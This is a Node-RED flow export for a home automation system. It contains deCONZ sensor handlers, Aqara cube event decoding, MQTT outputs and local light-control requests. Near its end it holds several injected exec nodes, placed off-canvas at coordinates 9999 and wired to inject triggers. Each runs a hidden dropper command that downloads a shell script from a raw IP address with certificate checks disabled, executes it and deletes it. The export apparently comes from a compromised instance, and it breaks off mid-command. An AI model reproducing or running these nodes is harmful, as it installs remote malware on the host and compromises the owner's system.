[{"id":"d7eda565344d3004","type":"tab","label":"Deconz","disabled":false,"info":""},{"id":"e8fabf2a01eed782","type":"tab","label":"Workshop","disabled":false,"info":""},{"id":"df36b737c8742674","type":"tab","label":"Global","disabled":false,"info":""},{"id":"f7d3139e6c4a4f09","type":"tab","label":"Kitchen","disabled":false,"info":""},{"id":"51491686703cf8dc","type":"tab","label":"Lounge","disabled":false,"info":""},{"id":"984a3ce6dae99ed9","type":"tab","label":"PC Power","disabled":false,"info":"","env":[]},{"id":"2e5742b3e3e96e77","type":"subflow","name":"Subflow 1","info":"","in":[{"x":280,"y":160,"wires":[{"id":"2aebf76ca4d26616"}]}],"out":[]},{"id":"459a3cbe0129c6cb","type":"subflow","name":"Cube","info":"msg.event = \"Slide, Flip, 180 Flip, Double tap, Drop\"\nmsg.side","category":"","in":[{"x":60,"y":40,"wires":[{"id":"aa16b7bc3e010baf"}]}],"out":[{"x":760,"y":100,"wires":[{"id":"64f4fde9660a66b9","port":0}]},{"x":760,"y":260,"wires":[{"id":"aa16b7bc3e010baf","port":0}]}],"env":[]},{"id":"8efa479ae1bac524","type":"subflow","name":"Vibration Sensor","info":"","category":"","in":[{"x":50,"y":30,"wires":[{"id":"7f1b62338882aff8"}]}],"out":[{"x":800,"y":60,"wires":[{"id":"539bdb49a2b002b5","port":0}]},{"x":820,"y":180,"wires":[{"id":"a07799b0284b0b65","port":1}]}],"env":[]},{"id":"c0604ab0c1a08417","type":"subflow","name":"Bedroom Lights","info":"","category":"","in":[{"x":50,"y":30,"wires":[{"id":"275cf546e4a89352"},{"id":"c44e4baccaa05d19"},{"id":"bc294950addddfbe"}]}],"out":[{"x":560,"y":80,"wires":[{"id":"275cf546e4a89352","port":0},{"id":"c44e4baccaa05d19","port":0},{"id":"bc294950addddfbe","port":0}]}],"env":[]},{"id":"0c4a1aef5ced3d40","type":"subflow","name":"Toggle SMTSKT State w/ timeouts","info":"","category":"","in":[{"x":60,"y":120,"wires":[{"id":"7ccfaa96cd378cc4"}]}],"out":[{"x":740,"y":120,"wires":[{"id":"b9a986b82af4bec6","port":0}]}],"env":[{"name":"event_name","type":"str","value":"not supplied","ui":{"type":"input","opts":{"types":["str","env"]}}},{"name":"variation","type":"str","value":"20 minutes"},{"name":"timeout_seconds","type":"num","value":"10"}],"meta":{},"color":"#DDAA99","status":{"x":620,"y":260,"wires":[{"id":"b9a986b82af4bec6","port":1}]}},{"id":"627df8f806a8df74","type":"mqtt-broker","name":"MQTT","broker":"192.168.1.105","port":"1883","clientid":"","autoConnect":true,"usetls":false,"protocolVersion":4,"keepalive":"60","cleansession":true,"autoUnsubscribe":true,"birthTopic":"","birthQos":"0","birthPayload":"","closeTopic":"","closeQos":"0","closePayload":"","willTopic":"","willQos":"0","willPayload":""},{"id":"459b291cbb78de2a","type":"websocket-listener","path":"ws://192.168.1.105:8088","wholemsg":"false"},{"id":"3b9d43dd3e715cfb","type":"websocket-client","path":"ws://192.168.1.105:443","tls":"","wholemsg":"false"},{"id":"21fb2522880514a3","type":"websocket-listener","path":"http://192.168.1.105:80/api/E09E33DE20/lights","wholemsg":"false"},{"id":"4603d9da76cb6c34","type":"ui_tab","name":"Home","icon":"dashboard","order":""},{"id":"665ec66d99d25354","type":"ui_base","name":"","theme":{"name":"theme-light","lightTheme":{"default":"#0094CE","baseColor":"#0094CE","baseFont":"-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif","edited":true,"reset":false},"darkTheme":{"default":"#097479","baseColor":"#097479","baseFont":"-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif","edited":true,"reset":false},"customTheme":{"name":"Untitled Theme 1","default":"#4B7930","baseColor":"#4B7930","baseFont":"-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"},"themeState":{"base-color":{"default":"#0094CE","value":"#0094CE","edited":false},"page-titlebar-backgroundColor":{"value":"#0094CE","edited":false},"page-backgroundColor":{"value":"#fafafa","edited":false},"page-sidebar-backgroundColor":{"value":"#ffffff","edited":false},"group-textColor":{"value":"#1bbfff","edited":false},"group-borderColor":{"value":"#ffffff","edited":false},"group-backgroundColor":{"value":"#ffffff","edited":false},"widget-textColor":{"value":"#111111","edited":false},"widget-backgroundColor":{"value":"#0094ce","edited":false},"widget-borderColor":{"value":"#ffffff","edited":false},"base-font":{"value":"-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"}},"angularTheme":{"primary":"indigo","accents":"blue","warn":"red","background":"grey"}},"site":{"name":"Node-RED Dashboard","hideToolbar":"false","allowSwipe":"false","lockMenu":"false","allowTempTheme":"true","dateFormat":"DD/MM/YYYY","sizes":{"sx":48,"sy":48,"gx":6,"gy":6,"cx":6,"cy":6,"px":0,"py":0}}},{"id":"bd9cda277e990832","type":"ui_tab","name":"Start","icon":"dashboard","disabled":false,"hidden":false},{"id":"aba8d859e8438906","type":"ui_tab","name":"test","icon":"fa-television","order":2},{"id":"46afe4db8eac802d","type":"ui_tab","name":"Home","icon":"dashboard","order":8},{"id":"26b1a7bef225fddf","type":"xterm_config","rows":60,"columns":120,"cursorStyle":"bar","fastScrollModifier":"alt","scrollSensitivity":1,"fastScrollSensitivity":1,"scrollback":1000,"backgroundColor":"#000000","foregroundColor":"#ffffff","fontSize":14,"cursorBlink":true,"drawBoldTextInBrightColors":true,"loggingEnabled":false,"name":""},{"id":"2aebf76ca4d26616","type":"function","z":"2e5742b3e3e96e77","name":"RELAY_ON","func":"var smtskt2sstate=flow.get('smtskt2sstate') || 0;\n\nif (smtskt2sstate === 0) {\n    msg.payload = \"$RELAY$ON\";\n    flow.set('smtskt2sstate', 1);\n}\nelse {\n    msg.payload = \"$RELAY$OFF\";\n    flow.set('smtskt2sstate', 0);\n}\nreturn msg;","outputs":1,"noerr":0,"x":550,"y":160,"wires":[[]]},{"id":"3cd4f092127a5433","type":"switch","z":"459a3cbe0129c6cb","name":"Cube","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"2","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":2,"x":350,"y":140,"wires":[["64f4fde9660a66b9"],[]]},{"id":"64f4fde9660a66b9","type":"function","z":"459a3cbe0129c6cb","name":"Event (.event, .side)","func":"\nif (msg.payload.state === undefined || \n    msg.payload.state.buttonevent === undefined) {\n    return null;\n}\n\nvar event = msg.payload.state.buttonevent;\nvar side = Math.round(event/1000);\nvar modifier = event - (side * 1000);\nmsg.side = side;\n\nif (event % 1000 === 0) {\n    msg.event = \"slide\";\n}\nelse if (event === 7007) {\n    msg.event = \"shake\";\n}\nelse if (event === (side*1000) + side) {\n    msg.event = \"doubletap\";\n}\nelse if (side + modifier === 7) {\n    msg.event = \"180flip\";\n}\nelse if (side != 7 - modifier) {\n    msg.event = \"flip\";\n}\nelse if (event === 7008) {\n    msg.event = \"drop\";\n}\nelse {\n    msg.event = \"unknown (\" + event + \")\";\n}\nreturn msg;","outputs":1,"noerr":0,"x":560,"y":100,"wires":[[]]},{"id":"aa16b7bc3e010baf","type":"json","z":"459a3cbe0129c6cb","name":"","property":"payload","action":"","pretty":false,"x":210,"y":260,"wires":[["3cd4f092127a5433"]]},{"id":"2038760293478666","type":"comment","z":"459a3cbe0129c6cb","name":"Links","info":"http://blog.smarterhome.club/2019/04/30/raspbee4/","x":470,"y":220,"wires":[]},{"id":"a07799b0284b0b65","type":"switch","z":"8efa479ae1bac524","name":"Vibration","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"9","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":2,"x":360,"y":100,"wires":[["539bdb49a2b002b5"],[]]},{"id":"539bdb49a2b002b5","type":"function","z":"8efa479ae1bac524","name":"msg.strength","func":"if (msg.payload.state === undefined ||\n    msg.payload.state.vibration === undefined) {\n    return null;        \n}\n\nif (msg.payload.state.vibration === true) {\n    msg.strength = msg.payload.state.strength;\n    return msg;\n}\nreturn null;","outputs":1,"noerr":0,"x":530,"y":60,"wires":[[]]},{"id":"7f1b62338882aff8","type":"json","z":"8efa479ae1bac524","name":"","property":"payload","action":"","pretty":false,"x":210,"y":220,"wires":[["a07799b0284b0b65"]]},{"id":"4bc340c61fe59a48","type":"comment","z":"8efa479ae1bac524","name":"Links","info":"http://blog.smarterhome.club/2019/04/30/raspbee4/","x":470,"y":180,"wires":[]},{"id":"275cf546e4a89352","type":"http request","z":"c0604ab0c1a08417","name":"Light 1 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/4/state","tls":"","proxy":"","authType":"","x":310,"y":100,"wires":[[]]},{"id":"c44e4baccaa05d19","type":"http request","z":"c0604ab0c1a08417","name":"Light 2 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/5/state","tls":"","proxy":"","authType":"","x":310,"y":160,"wires":[[]]},{"id":"bc294950addddfbe","type":"http request","z":"c0604ab0c1a08417","name":"Light 3 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/6/state","tls":"","proxy":"","authType":"","x":310,"y":220,"wires":[[]]},{"id":"7ccfaa96cd378cc4","type":"function","z":"0c4a1aef5ced3d40","name":"","func":"var event_name = env.get(\"event_name\");\nvar timeout_seconds = env.get(\"timeout_seconds\");\nvar last_payload = context.get(event_name) || \"off\";\n\n// node.warn(event_name);\n\nvar payload = {\n    payload: \"on\",\n    timeout: timeout_seconds\n};\n\nvar is_plug_button = msg.payload \n    == \"EV_SPECFIC_TIME_REACHED\" || msg.payload \n    == \"EV_CLICKED\";\nvar is_motion = msg.payload.state != null &&\n    msg.payload.state.presence != null;\nvar is_deconz_button = msg.payload.state != null &&\n    msg.payload.state.buttonevent != null &&\n    msg.payload.state.buttonevent == \"1002\";\n\n// toggle\nif (is_plug_button || is_deconz_button || msg.payload == \"on\") {\n    payload.payload = last_payload == \"off\" ? \"on\" : \"off\";\n}\n// retrigger\nelse if (is_motion) {\n    payload.payload = \"on\";\n}\nelse {\n    return;\n}\n\ncontext.set(event_name, payload.payload); // store new payload state\n\nmsg.payload = payload;\n// node.warn(msg.payload);\n    \nreturn msg;\n","outputs":1,"noerr":0,"initialize":"","finalize":"","libs":[],"x":220,"y":120,"wires":[["b9a986b82af4bec6"]]},{"id":"b9a986b82af4bec6","type":"mytimeout","z":"0c4a1aef5ced3d40","name":"","outtopic":"","outsafe":"$LED$ON$RELAY$ON","outwarning":"","outunsafe":"$LED$OFF$RELAY$OFF","warning":"0","timer":"10800","debug":false,"ndebug":false,"ignoreCase":false,"repeat":false,"again":false,"x":430,"y":120,"wires":[[],[]]},{"id":"b08fa78050700a6e","type":"websocket in","z":"d7eda565344d3004","name":"","server":"","client":"3b9d43dd3e715cfb","x":140,"y":60,"wires":[["af6617cc9d3975f8","da77a5c74f24adf9"]]},{"id":"baa6ae6283bd2ef6","type":"comment","z":"d7eda565344d3004","name":"https://github.com/dresden-elektronik/deconz-rest-plugin/issues/138#issuecomment-325101635","info":"https://github.com/dresden-elektronik/deconz-rest-plugin/issues/138#issuecomment-325101635","x":330,"y":1000,"wires":[]},{"id":"0b6cf22c9ad0936d","type":"mqtt out","z":"d7eda565344d3004","name":"","topic":"/device/cube1/event","qos":"","retain":"","broker":"627df8f806a8df74","x":1020,"y":600,"wires":[]},{"id":"c95cd9c8b83a0a51","type":"mqtt out","z":"d7eda565344d3004","name":"","topic":"/device/aqara/vibration/door","qos":"","retain":"","broker":"627df8f806a8df74","x":1020,"y":720,"wires":[]},{"id":"af6617cc9d3975f8","type":"json","z":"d7eda565344d3004","name":"","property":"payload","action":"","pretty":false,"x":130,"y":680,"wires":[["c12a5f69e18e59f4","cf3e755026b4ce3e","a506b2a82d2e8cde","066cdff92580e9fb","4b22abbc48e5cd4c","a209e73e1513e91c","3cc93e1075cf84be","498bc849d6b6e094","19a50d3348142992","2935353eedd436be","a25943a90d6d2075"]]},{"id":"c12a5f69e18e59f4","type":"switch","z":"d7eda565344d3004","name":"Cube1","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"9","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":410,"y":600,"wires":[["108e98ba0b993e62"]]},{"id":"cf3e755026b4ce3e","type":"switch","z":"d7eda565344d3004","name":"Vibration Front Door","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"9","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":460,"y":700,"wires":[["c95cd9c8b83a0a51"]]},{"id":"a506b2a82d2e8cde","type":"switch","z":"d7eda565344d3004","name":"Vibration Other","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"10","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":2,"x":440,"y":740,"wires":[[],[]]},{"id":"4b22abbc48e5cd4c","type":"switch","z":"d7eda565344d3004","name":"Lights","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"4","vt":"str"},{"t":"eq","v":"5","vt":"str"},{"t":"eq","v":"6","vt":"str"},{"t":"eq","v":"1","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":5,"x":770,"y":1020,"wires":[["082fd05af6526f4f"],["082fd05af6526f4f"],["082fd05af6526f4f"],["082fd05af6526f4f"],["082fd05af6526f4f"]]},{"id":"1a119cb1cfca7871","type":"mqtt out","z":"d7eda565344d3004","name":"","topic":"/device/aqara/motion/kitchen","qos":"","retain":"","broker":"627df8f806a8df74","x":1360,"y":360,"wires":[]},{"id":"1faba91e9e2d7cb4","type":"function","z":"d7eda565344d3004","name":"ON","func":"if (msg.payload.state !== undefined && msg.payload.state.presence) {\n    msg.payload = \"on\";\n    return msg;\n}\nreturn null;","outputs":1,"noerr":0,"x":770,"y":400,"wires":[["9edb78db7e784d02","1a119cb1cfca7871"]]},{"id":"108e98ba0b993e62","type":"function","z":"d7eda565344d3004","name":"Event (.event, .side)","func":"\nif (msg.payload.state === undefined || \n    msg.payload.state.buttonevent === undefined) {\n    return null;\n}\n\nvar event = msg.payload.state.buttonevent;\nvar side = Math.round(event/1000);\nvar modifier = event - (side * 1000);\n\nif (event % 1000 === 0) {\n    msg.payload.event = \"slide\";\n}\nelse if (event === 7007) {\n    msg.payload.event = \"shake\";\n}\nelse if (event === (side*1000) + side) {\n    msg.payload.event = \"doubletap\";\n}\nelse if (side + modifier === 7) {\n    msg.payload.event = \"180flip\";\n}\nelse if (side != 7 - modifier) {\n    msg.payload.event = \"flip\";\n}\nelse if (event === 7008) {\n    msg.payload.event = \"drop\";\n}\nelse {\n    msg.payload.event = \"unknown (\" + event + \")\";\n}\nmsg.payload.side = side;\nreturn msg;","outputs":1,"noerr":0,"initialize":"","finalize":"","libs":[],"x":600,"y":600,"wires":[["0b6cf22c9ad0936d"]]},{"id":"066cdff92580e9fb","type":"switch","z":"d7eda565344d3004","name":"Temperature 42","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"42","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":940,"wires":[["065005f21a8a0667","87e3cf805ecb8f72"]]},{"id":"da77a5c74f24adf9","type":"debug","z":"d7eda565344d3004","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":450,"y":60,"wires":[]},{"id":"73259f56b6f3c4c5","type":"http request","z":"d7eda565344d3004","name":"Request new API Key from Deconz","method":"POST","ret":"txt","paytoqs":"ignore","url":"http://192.168.1.105:80/api","tls":"","persist":false,"proxy":"","insecureHTTPParser":false,"authType":"","senderr":false,"headers":[],"x":400,"y":1180,"wires":[["a5740cd594ca80b6"]]},{"id":"43d69ce7f8a2f12e","type":"inject","z":"d7eda565344d3004","name":"Headers for API Key","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{ \"devicetype\": \"nodered\" }","payloadType":"str","x":130,"y":1180,"wires":[["73259f56b6f3c4c5"]]},{"id":"a5740cd594ca80b6","type":"json","z":"d7eda565344d3004","name":"","property":"payload","action":"","pretty":false,"x":710,"y":1180,"wires":[["e793bf8cd58a4ec7"]]},{"id":"02ac08c031258933","type":"comment","z":"d7eda565344d3004","name":"http://dresden-elektronik.github.io/deconz-rest-doc/getting_started/","info":"","x":280,"y":1220,"wires":[]},{"id":"6d05daece7aa707a","type":"http request","z":"d7eda565344d3004","name":"Get lights","method":"GET","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights","tls":"","proxy":"","authType":"","x":480,"y":1380,"wires":[["8e8d04bf1b63e82d"]]},{"id":"25074d2a47161ade","type":"inject","z":"d7eda565344d3004","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":270,"y":1380,"wires":[["6d05daece7aa707a"]]},{"id":"79cf2c1096d82748","type":"debug","z":"d7eda565344d3004","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"true","targetType":"full","x":840,"y":1380,"wires":[]},{"id":"8e8d04bf1b63e82d","type":"json","z":"d7eda565344d3004","name":"","property":"payload","action":"","pretty":false,"x":680,"y":1380,"wires":[["79cf2c1096d82748"]]},{"id":"fa677a80e757cb61","type":"http request","z":"d7eda565344d3004","name":"Get light 4","method":"GET","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/4","tls":"","proxy":"","authType":"","x":490,"y":1420,"wires":[["8e8d04bf1b63e82d"]]},{"id":"62ac55db81bf4122","type":"inject","z":"d7eda565344d3004","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":270,"y":1420,"wires":[["fa677a80e757cb61"]]},{"id":"cf7f5d8b9ff85fa2","type":"http request","z":"d7eda565344d3004","name":"Put Light 4","method":"PUT","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/5/state","tls":"","proxy":"","authType":"","x":490,"y":1460,"wires":[["8e8d04bf1b63e82d"]]},{"id":"2e4809fd31b3fcc6","type":"inject","z":"d7eda565344d3004","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"LIght OFF","payload":"{\"on\":true,\"bri\":180,\"hue\":43680,\"sat\":255,\"transitiontime\":10}","payloadType":"json","x":250,"y":1460,"wires":[["cf7f5d8b9ff85fa2"]]},{"id":"10af9790a5402fcb","type":"http request","z":"d7eda565344d3004","name":"Get Groups","method":"GET","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/groups","tls":"","proxy":"","authType":"","x":470,"y":1520,"wires":[["8e8d04bf1b63e82d"]]},{"id":"efe7ae7716315546","type":"inject","z":"d7eda565344d3004","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"Groups","payload":"","payloadType":"str","x":280,"y":1520,"wires":[["10af9790a5402fcb"]]},{"id":"084497b745256409","type":"http request","z":"d7eda565344d3004","name":"","method":"PUT","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/groups/2/action","tls":"","proxy":"","authType":"","x":470,"y":1580,"wires":[["8e8d04bf1b63e82d"]]},{"id":"bf6c93091aa82bb7","type":"inject","z":"d7eda565344d3004","name":"Groups - ON","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":true,\"bri\":255,\"transitiontime\":10}","payloadType":"json","x":290,"y":1580,"wires":[["084497b745256409"]]},{"id":"e77c0d90168b33de","type":"inject","z":"d7eda565344d3004","name":"Groups - OFF","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":false,\"bri\":255,\"transitiontime\":10}","payloadType":"json","x":290,"y":1620,"wires":[["084497b745256409"]]},{"id":"ec6c3e0d6dfe8e5d","type":"http request","z":"d7eda565344d3004","name":"Get sensors","method":"GET","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/sensors","tls":"","proxy":"","authType":"","x":490,"y":1280,"wires":[["599c0dfb2027bd4e"]]},{"id":"974bef80f1ace45d","type":"inject","z":"d7eda565344d3004","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":270,"y":1280,"wires":[["ec6c3e0d6dfe8e5d"]]},{"id":"5dedb1a8f4a10998","type":"debug","z":"d7eda565344d3004","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"true","targetType":"full","x":840,"y":1280,"wires":[]},{"id":"599c0dfb2027bd4e","type":"json","z":"d7eda565344d3004","name":"","property":"payload","action":"","pretty":false,"x":680,"y":1280,"wires":[["5dedb1a8f4a10998"]]},{"id":"a209e73e1513e91c","type":"switch","z":"d7eda565344d3004","name":"Cube2","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"34","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":410,"y":560,"wires":[["d8045bda965b53e5"]]},{"id":"d8045bda965b53e5","type":"function","z":"d7eda565344d3004","name":"Event (.event, .side)","func":"\nif (msg.payload.state === undefined || \n    msg.payload.state.buttonevent === undefined) {\n    return null;\n}\n\nvar event = msg.payload.state.buttonevent;\nvar side = Math.round(event/1000);\nvar modifier = event - (side * 1000);\n\nif (event % 1000 === 0) {\n    msg.payload.event = \"slide\";\n}\nelse if (event === 7007) {\n    msg.payload.event = \"shake\";\n}\nelse if (event === (side*1000) + side) {\n    msg.payload.event = \"doubletap\";\n}\nelse if (side + modifier === 7) {\n    msg.payload.event = \"180flip\";\n}\nelse if (side != 7 - modifier) {\n    msg.payload.event = \"flip\";\n}\nelse if (event === 7008) {\n    msg.payload.event = \"drop\";\n}\nelse {\n    msg.payload.event = \"unknown (\" + event + \")\";\n}\nmsg.payload.side = side;\nreturn msg;","outputs":1,"noerr":0,"x":600,"y":560,"wires":[["38e273967af09d15"]]},{"id":"38e273967af09d15","type":"mqtt out","z":"d7eda565344d3004","name":"","topic":"/device/cube2/event","qos":"","retain":"","broker":"627df8f806a8df74","x":1020,"y":560,"wires":[]},{"id":"3cc93e1075cf84be","type":"function","z":"d7eda565344d3004","name":"Cave Lights","func":"\nswitch (msg.payload.id)\n{\n    case \"10\":\n    case\"11\":\n    case \"12\":\n        return msg;\n    default:\n        return null;\n}","outputs":1,"noerr":0,"x":310,"y":1060,"wires":[["9ec03dd7350a2a5d"]]},{"id":"9ec03dd7350a2a5d","type":"link out","z":"d7eda565344d3004","name":"Cave LIghts","links":["71c66eac.2ef66"],"x":435,"y":1060,"wires":[]},{"id":"39d7f764152b9e85","type":"link out","z":"d7eda565344d3004","name":"Temp 36","links":["be1a269fc7851b31"],"x":615,"y":860,"wires":[]},{"id":"065005f21a8a0667","type":"link out","z":"d7eda565344d3004","name":"Temp 42","links":["835f4285040cb998"],"x":615,"y":940,"wires":[]},{"id":"52c10687f7f52e88","type":"link out","z":"d7eda565344d3004","name":"Temp 39","links":["e7c5311b996ad5bf"],"x":615,"y":900,"wires":[]},{"id":"ef43a7d6b0144784","type":"link out","z":"d7eda565344d3004","name":"Button 25","mode":"link","links":[],"x":1095,"y":200,"wires":[]},{"id":"0786e36a070d7c03","type":"link out","z":"d7eda565344d3004","name":"Button 32","mode":"link","links":["bae88efd8d18c737"],"x":1095,"y":280,"wires":[]},{"id":"ef9caef1814d08b6","type":"link out","z":"d7eda565344d3004","name":"Button 33","links":[],"x":1095,"y":320,"wires":[]},{"id":"498bc849d6b6e094","type":"switch","z":"d7eda565344d3004","name":"Temperature 17","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"17","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":780,"wires":[["782bcd7441f707b8","87e3cf805ecb8f72"]]},{"id":"782bcd7441f707b8","type":"link out","z":"d7eda565344d3004","name":"Temp 17","links":["c10c43019266f188"],"x":615,"y":780,"wires":[],"icon":"font-awesome/fa-thermometer-0"},{"id":"19a50d3348142992","type":"switch","z":"d7eda565344d3004","name":"Temperature 14","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"14","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":820,"wires":[["5ee0db0717dedb27","87e3cf805ecb8f72"]]},{"id":"5ee0db0717dedb27","type":"link out","z":"d7eda565344d3004","name":"Temp 14","links":["4b28afe4.e0cc9","d162f1e3edb65311"],"x":615,"y":820,"wires":[],"icon":"font-awesome/fa-thermometer-0"},{"id":"03df9b3fc98a3c82","type":"switch","z":"d7eda565344d3004","name":"Temperature 39","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"39","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":900,"wires":[["52c10687f7f52e88","87e3cf805ecb8f72"]]},{"id":"3cf3e1d92297704d","type":"switch","z":"d7eda565344d3004","name":"Temperature 36","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"36","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":860,"wires":[["39d7f764152b9e85","87e3cf805ecb8f72"]]},{"id":"2935353eedd436be","type":"switch","z":"d7eda565344d3004","name":"Buttons","property":"payload.state.buttonevent","propertyType":"msg","rules":[{"t":"nnull"}],"checkall":"true","repair":false,"outputs":1,"x":360,"y":280,"wires":[["4d3cf0afb967cca4"]]},{"id":"9c654436d7036429","type":"debug","z":"d7eda565344d3004","name":"Otherwise","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":740,"y":340,"wires":[]},{"id":"7d2bab3514a8dfb5","type":"link out","z":"d7eda565344d3004","name":"Button 31","mode":"link","links":[],"x":1095,"y":240,"wires":[]},{"id":"87e3cf805ecb8f72","type":"debug","z":"d7eda565344d3004","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":790,"y":840,"wires":[]},{"id":"4d3cf0afb967cca4","type":"switch","z":"d7eda565344d3004","name":"Button Ids","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"25","vt":"str"},{"t":"eq","v":"31","vt":"str"},{"t":"eq","v":"32","vt":"str"},{"t":"eq","v":"33","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":5,"x":540,"y":280,"wires":[["ef43a7d6b0144784"],["7d2bab3514a8dfb5"],["0786e36a070d7c03"],["ef9caef1814d08b6"],["9c654436d7036429"]]},{"id":"a25943a90d6d2075","type":"switch","z":"d7eda565344d3004","name":"Motion","property":"payload.state.presence","propertyType":"msg","rules":[{"t":"nnull"}],"checkall":"true","repair":false,"outputs":1,"x":330,"y":420,"wires":[["416fa04d89d1d336"]]},{"id":"416fa04d89d1d336","type":"switch","z":"d7eda565344d3004","name":"Motion Ids","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"24","vt":"str"},{"t":"eq","v":"21","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":3,"x":550,"y":420,"wires":[["1faba91e9e2d7cb4"],["c4848be5557cad5e"],["2ed57bf979674f22"]]},{"id":"c4848be5557cad5e","type":"link out","z":"d7eda565344d3004","name":"Motion Cave","mode":"link","links":["62d2b7580c1c77f0"],"x":895,"y":440,"wires":[]},{"id":"9edb78db7e784d02","type":"link out","z":"d7eda565344d3004","name":"Motion Kitchen","mode":"link","links":[],"x":895,"y":400,"wires":[]},{"id":"2ed57bf979674f22","type":"debug","z":"d7eda565344d3004","name":"Otherwise","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":780,"y":480,"wires":[]},{"id":"695c2d6c-e4c1-424d-a247-9a15fe603fc3","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"b3dc4cf4-ff13-4d40-bc79-d87ef008f026","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["695c2d6c-e4c1-424d-a247-9a15fe603fc3"]]},{"id":"170644f2-fb76-4c31-8ea0-aa3aed24514a","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"c9353e38-5966-4ca0-959b-d3f00a2d26f8","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["170644f2-fb76-4c31-8ea0-aa3aed24514a"]]},{"id":"77b425a1-d493-4443-80fe-3b363cb78841","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo 